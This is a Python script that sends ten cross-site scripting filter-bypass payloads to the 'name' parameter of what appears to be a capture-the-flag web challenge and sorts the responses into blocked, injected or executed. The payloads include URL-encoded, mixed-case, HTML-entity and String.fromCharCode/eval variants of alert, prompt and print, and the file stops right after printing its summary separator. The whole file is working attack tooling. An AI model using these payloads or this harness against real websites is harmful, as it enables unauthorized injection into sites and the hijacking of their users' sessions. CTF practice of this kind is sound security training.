import requests
import urllib.parse
import html
import time

# Configuration
base_url = "http://ctf.madebynull.io:5000"
endpoint = "/page"
full_url = base_url + endpoint

print("XSS ENCODING BYPASS TESTING")
print(f"Target: POST {full_url}")
print("Parameter: name")
print("="*60)

# Most promising payloads to test first
payloads = [
    {
        "strategy": "Direct Prompt",
        "payload": "\";prompt('XSS');//"
    },
    {
        "strategy": "Direct Print", 
        "payload": "\";print('XSS');//"
    },
    {
        "strategy": "Fully URL Encoded Prompt",
        "payload": "%22%3Bprompt%28%27XSS%27%29%3B%2F%2F"
    },
    {
        "strategy": "Fully URL Encoded Print",
        "payload": "%22%3Bprint%28%27XSS%27%29%3B%2F%2F"
    },
    {
        "strategy": "Partial URL - pr encoded (e blocked?)",
        "payload": "\";" + urllib.parse.quote("pr") + "ompt('XSS');//"
    },
    {
        "strategy": "Partial URL - pt encoded",
        "payload": "\";pro" + urllib.parse.quote("mpt") + "('XSS');//"
    },
    {
        "strategy": "Uppercase Alert",
        "payload": "\";ALERT('XSS');//"
    },
    {
        "strategy": "Mixed Case Alert",
        "payload": "\";AlErT('XSS');//"
    },
    {
        "strategy": "HTML Entity Alert",
        "payload": "\";" + html.escape('alert') + "('XSS');//"
    },
    {
        "strategy": "CharCode via eval",
        "payload": "\";eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));//"
    }
]

results = []
for i, test in enumerate(payloads, 1):
    print(f"\n--- Test {i}: {test['strategy']} ---")
    payload = test['payload']
    
    try:
        # Send POST request with delay to avoid rate limiting
        response = requests.post(
            full_url,
            data={'name': payload},
            timeout=10
        )
        
        print(f"Status: {response.status_code}")
        print(f"Payload: {payload}")
        
        html_content = response.text
        
        # Check for various reflection patterns
        if payload in html_content:
            print("✗ BLOCKED: Payload reflected literally")
            status = "Blocked - Literal"
        elif urllib.parse.unquote(payload) in html_content:
            print("✗ BLOCKED: URL-decoded and reflected")
            status = "Blocked - URL Decoded"
        elif "prompt('XSS')" in html_content or "print('XSS')" in html_content or "ALERT('XSS')" in html_content:
            # Check if it's in a script context
            if "<script" in html_content:
                print("✓ ATTENTION: Injection in script context (may execute)")
                status = "Injected - Script Context"
            else:
                print("✗ Injected but wrong context")
                status = "Injected - Wrong Context"
        elif "alert(" in html_content or "prompt(" in html_content:
            if "&lt;" not in html_content:
                print("✓ SUCCESS: XSS appears to execute")
                status = "Success - XSS Executed"
            else:
                print("? Possibly escaped")
                status = "Uncertain"
        else:
            print("? Payload not visible in response")
            status = "Unknown"
        
        # Show relevant snippets if payload is reflected  
        if payload in html_content:
            try:
                idx = html_content.index(payload)
                snippet = html_content[max(0, idx-30):idx+min(40, len(payload))]
                print(f"Snippet: ...{snippet}...")
            except:
                pass
                
        results.append({"test": i, "strategy": test['strategy'], "status": status, "payload": payload})
        
        # Small delay between requests
        time.sleep(0.5)
        
    except Exception as e:
        print(f"Error: {e}")
        results.append({"test": i, "strategy": test['strategy'], "status": f"Error: {e}", "payload": payload})

# Summary
print("\n" + "="*60)
